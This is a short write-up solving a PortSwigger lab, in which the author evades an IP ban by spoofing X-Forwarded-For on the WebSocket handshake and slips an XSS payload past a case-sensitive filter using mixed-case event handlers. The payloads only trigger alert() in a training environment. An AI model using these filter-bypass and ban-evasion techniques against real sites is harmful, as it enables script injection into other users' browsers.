# Lab: Manipulating the WebSocket handshake to exploit vulnerabilities (Practitioner)

**Lab:** [https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)

**Task (from PortSwigger):**  
This online shop has a live chat feature implemented using WebSockets.

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

## Vulnerability
1. Aggressive XSS filter blocks basic payloads and bans the IP (connection drop).
2. Ban is based on IP; spoofable via `X-Forwarded-For` on the WebSocket handshake.
3. Filter is case-sensitive / incomplete — obfuscated event handlers bypass it.

## Solution

1. Send a basic XSS payload via WebSocket Repeater:

```
<img src=1 onerror='alert(1)'>
```

→ blocked, connection terminated, IP banned.

2. In Repeater, edit the handshake (pencil icon → reconnect/clone) and add:

```
X-Forwarded-For: 1.1.1.1
```

Connect successfully.

3. Send obfuscated payload:

```
<img src=1 oNeRrOr=alert`1`>
```

Alert fires → lab solved.

## Final Payload
```
<img src=1 oNeRrOr=alert`1`>
```

Handshake header:
```
X-Forwarded-For: 1.1.1.1
```
